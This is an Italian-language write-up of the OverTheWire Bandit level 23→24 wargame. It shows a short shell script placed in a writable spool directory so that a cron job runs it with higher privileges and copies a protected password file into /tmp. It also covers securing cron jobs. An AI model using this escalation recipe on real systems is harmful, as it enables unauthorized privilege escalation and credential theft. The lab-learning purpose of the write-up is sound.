# Bandit Level 23 → Level 24

## Obiettivo
Sfruttare un cron job che esegue script arbitrari da una directory per ottenere i privilegi di bandit24 e leggere la password protetta.

## Comandi utilizzati
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220

# 1. Esaminare la configurazione cron
cat /etc/cron.d/cronjob_bandit24

# 2. Analizzare lo script eseguito dal cron
cat /usr/bin/cronjob_bandit24.sh

# 3. Creare uno script di sfruttamento
cd /var/spool/bandit24/foo
cat > exploit.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass_$(whoami)
EOF

# 4. Impostare permessi di esecuzione
chmod +x exploit.sh

# 5. Attendere l'esecuzione del cron (massimo 60 secondi)
# 6. Leggere il file creato
cat /tmp/bandit24_pass_bandit24
```

## Analisi tecnica

### Cosa ho imparato
- **Privilege escalation via cron**: script eseguiti con privilegi elevati da directory scrivibili
- **Primo script shell**: creazione di script per automatizzare exploitation
- **Recupero output**: scrittura risultati in file persistenti accessibili
- **Timing attack**: sincronizzazione con esecuzione periodica del cron

### Script del cron job (/usr/bin/cronjob_bandit24.sh)
```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"

for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

### Vulnerabilità critiche
1. Directory scrivibile: `/var/spool/bandit24/foo` scrivibile da bandit23
2. Esecuzione arbitraria: qualsiasi file di proprietà bandit23 viene eseguito come bandit24
3. Nessuna validazione: nessun controllo sul contenuto degli script
4. Output non controllato: lo script può scrivere dati sensibili in file accessibili

### Domande Aperte
- Quali altre tecniche di privilege escalation via cron esistono?
- Come proteggere cron job da esecuzione arbitraria?
- In penetration test, come enumerare cron job scrivibili?
- Quali sono le implicazioni di sicurezza di `rm -f` dopo l'esecuzione?
- Come monitorare tentativi di exploitation via cron?

### Note
Questo livello rappresenta una **importante pietra miliare**: il primo script shell creato per exploitation.

In scenari reali, vulnerabilità simili sono state sfruttate in:

- Server web con directory upload non protette
- Sistemi di build/CI con permessi eccessivi
- Automazione sysadmin con controlli insufficienti


**Best practice per cron job sicuri**:

1. Directory di input con permessi ristretti 
2. Validazione contenuto script
3. Esecuzione in ambienti isolati
4. Logging dettagliato di tutte le esecuzioni
5. Limitazione risorse 